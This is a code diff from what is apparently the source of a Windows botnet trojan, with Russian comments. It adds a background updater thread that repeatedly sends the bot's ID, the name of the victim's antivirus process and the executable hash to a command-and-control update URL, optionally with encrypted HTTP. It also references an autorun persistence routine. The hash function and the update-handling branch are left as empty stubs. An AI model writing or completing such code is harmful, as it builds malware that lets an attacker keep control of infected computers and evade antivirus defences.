@@ -3,7 +3,7 @@
 
 #include "BotCore.h"
 #include "BotUtils.h"
-//#include "Exception.h"
+#include "BotDef.h"
 
 
 //---------------------------------------------------------------------------
@@ -321,4 +321,90 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 	STR::Free(BotFile);
 
 	return Result;
+}
+
+
+//----------------------------------------------------
+//  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
+//----------------------------------------------------
+string BOT::BotExeMD5()
+{
+	string Result;
+
+	return Result;
+}
+
+
+//****************************************************************************
+//                                  TBotUpdater
+//****************************************************************************
+TBotUpdater::TBotUpdater()
+	: TBotThread(false)
+{
+	Interval = 10000;
+
+	Start();
+}
+//----------------------------------------------------------
+
+void TBotUpdater::DoExecute()
+{
+	// Запускаем цикл автоматического обновления бота
+	while (!Terminated())
+	{
+		DWORD UpdateInterval = Interval;
+
+		Update(UpdateInterval);
+
+		pSleep(UpdateInterval);
+	}
+
+}
+//----------------------------------------------------------
+
+void TBotUpdater::Update(DWORD &UpdateInterval)
+{
+	// Функция выполняет автоматическое обновление бота
+
+	// Интервал обновления в случае ошибки
+	const static DWORD ErrorInterval = 60000;
+
+	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_BOT);
+	if (!URL)
+	{
+		UpdateInterval = ErrorInterval;
+		return;
+	}
+
+	// Выполняем запрос
+	string UID = GenerateBotID2();
+	string AV  = GetAntiVirusProcessName();
+	string MD5 = BOT::BotExeMD5();
+
+	TBotStrings Fields;
+
+	Fields.AddValue(HTTP_FIELD_UID,     UID);
+	Fields.AddValue(HTTP_FIELD_ANTIVIR, AV);
+	Fields.AddValue(HTTP_FIELD_MD5,     MD5);
+
+
+	#ifdef CryptHTTPH
+		TCryptHTTP HTTP;
+		HTTP.Password = GetMainPassword2();
+	#else
+		THTTP HTTP;
+	#endif
+
+
+	string Buf;
+
+    bool Done = HTTP.Post(URL, &Fields, Buf);
+
+	if (Done && !Buf.IsEmpty())
+	{
+        // Выполняем обновление
+    }
+
+	STR::Free(URL);
+
 }
